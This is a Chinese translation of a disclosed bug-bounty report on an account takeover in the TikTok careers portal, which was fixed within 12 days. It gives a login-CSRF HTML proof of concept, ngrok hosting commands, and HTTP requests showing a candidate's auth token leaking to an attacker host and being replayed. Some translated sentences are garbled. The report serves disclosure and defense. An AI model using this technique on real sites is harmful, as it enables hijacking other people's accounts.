TikTok职业生涯门户网站帐户接管

以下漏洞报告（略作修改）已于2020年10月17日使用Hackerone发送到TikTok，并在12天内得到解决。


咨询

候选人用来申请职位的TikTok事业门户网站（以下是根据TikTok的安全团队的要求修改为[reded domain 1]的内容），使用Facebook和LinkedIn实现单点登录。由于缺少CSRF保护，甚至更糟的是Open Redirect漏洞，恶意行为者可以接管候选人的TikTok Careers帐户。此漏洞仅限于TikTok Careers门户网站，不会影响TikTok Web或移动应用程序。


缺少CSRF保护

先决条件：为了执行帐户接管，我们要求我们的候选人先前使用其Facebook帐户在[已编辑的域1]进行身份验证，因此已获得与TikTok共享数据的初步同意。此外，我们要求候选人在Facebook上进行有效的会话。


TikTok没有充分保护启动与Facebook有关CSRF的登录流程的端点。因此，使用琐碎的CSRF攻击，恶意攻击者可以将候选人身份验证到其自己的帐户中：

<html><body><script>history.pushState('', '', '/')</script><form action="https://[redacted domain 1]/api/v1/user/facebook/login"><input type="hidden" name="next&#95;url" value="https&#58;&#47;&#47;redacted&#46;tiktok&#46;com&#47;" /><input type="submit" value="Submit request" /></form></body></html>

请注意，由于以下行为，上述PoC不能以1：1的方式工作。如果我们忽略以下步骤，则候选人将在常规登录流程结束时通过身份验证进入其自己的帐户。


身份验证响应目标

如果Referer对的请求中存在标头

https://[redacted domain 1]/api/v1/user/facebook/login

则将高度敏感的信息token披露给潜在的攻击者控制的域。使用此工具token，攻击者便可以将其认证为已token被获取的候选者。这是可能的，因为对于TikTok而言，它token是一个不透明的值，无法对其主题进行验证。


组装拼图-复制/利用步骤

就像在Barth等人介绍的Web攻击者模型中一样。在2008年

https://www.adambarth.com/papers/2008/barth-jackson-mitchell.pdf

我们要求候选人访问攻击者控制的网站。此外，如前所述，我们要求候选人的Facebook帐户必须链接到TikTok的职业门户。


0.[准备]保存上述Login CSRF PoC并启动一个简单的Web服务器：

$ python -m http.server 1234

  1. [准备]由于稍后需要TLS，请启动ngrok（https://ngrok.com/）以获取具有有效证书的公共（子）域（获取公共URL以获取进一步的步骤）：

$ ngrok http 1234

2.[候选人]候选人浏览https://abcdefghij.ngrok.io上的公开可用PoC（受攻击者控制）-为说明攻击，请手动单击“提交请求”（也可以使用JavaScript来完成，以隐藏请求（来自候选人）。


3.[背景]在没有进一步的候选者交互的情况下，对TikTok端点的请求启动了登录流程。Referer标头在此步骤中很重要：

GET /api/v1/user/facebook/login?next_url=https%3A%2F%2F[redacted_domain_1]%2F HTTP/1.1Host: [redacted domain 1][...]Referer: https://abcdefghij.ngrok.ioCookie: [REDACTED]

4.[背景]在没有进一步候选人互动的情况下，候选人被重定向到Facebook：

HTTP/1.1 302 Moved TemporarilyServer: nginxContent-Type: text/html; charset=utf-8Content-Length: 283Location: https://www.facebook.com/v3.2/dialog/oauth?client_id=792134571243895&redirect_uri=https%3A%2F%2F[redacted domain 2]%2Fapi%2Fv1%2Fopen%2Fportal%2Foauth%2Ffacebook%2Fcallback&response_type=code&state=[REDACTED][...]

5.[背景]由于该候选人在Facebook上正在进行会话，并且该帐户已经链接到[已编辑域1]，因此Facebook将候选人重定向回，而redirect_uri无需任何进一步的交互：

HTTP/1.1 302 Found[...]Location: https://[redacted domain 2]/api/v1/open/portal/oauth/facebook/callback?code=[REDACTED]&state=[REDACTED]D#_=_

6.[背景]https://[redacted domain 2]将候选人重定向到

/api/v1/user/facebook/callbackas 路径。

重要：在这样做时，它会使用对TikTok端点的第一个请求中存在的主机。由于此请求是由攻击者控制的，因此攻击者可以泄漏参数：

Referer/api/v1/user/facebook/logintoken
GET /api/v1/user/facebook/callback?next_url=https%3A%2F%2F[redacted_domain_1]%2F&platform=pc&token=[CANDIDATE-TOKEN]&website-path=tiktok HTTP/1.1Host: abcdefghij.ngrok.io[...]

总结：

在这一点上，具有发起CSRF攻击能力的攻击者可以获得token与候选人的Facebook帐户绑定的。


从攻击者的角度并在全新的浏览器会话中执行以下步骤。


7.[攻击者]攻击者浏览https://[redacted domain 1]/login并单击Facebook按钮。


8.[攻击者]攻击者将执行以下所有步骤，并将所有请求转发至最终请求（包括他的请求）token将被发送到的位置https://[redacted domain 1]/api/v1/user/facebook/callback-在此请求中，攻击者将他的请求交换为绑定到候选人帐户token的先前获得的请求token。

GET /api/v1/user/facebook/callback?next_url=https%3A%2F%2F[redacted_domain_1]%2F&platform=pc&token=[CANDIDATE-TOKEN]&website-path=tiktok HTTP/1.1Host: [redacted domain 1][...]

9.

[攻击者]攻击者被认证为[已编辑域1]上的候选者。

通用流程如下：

影响

恶意行为者可以使用跨站点请求伪造在[已编辑域1]上接管候选人的帐户。


推荐

在初次报告中提出了以下建议：

  1. 为启动身份验证流程的端点实施CSRF保护，以缓解Login CSRF（将候选人身份验证到其帐户中）。

  2. 请勿token向第三方透露与身份验证相关的敏感参数。如果Referer使用来确定的目标，则token必须使用适当的白名单来验证其值！
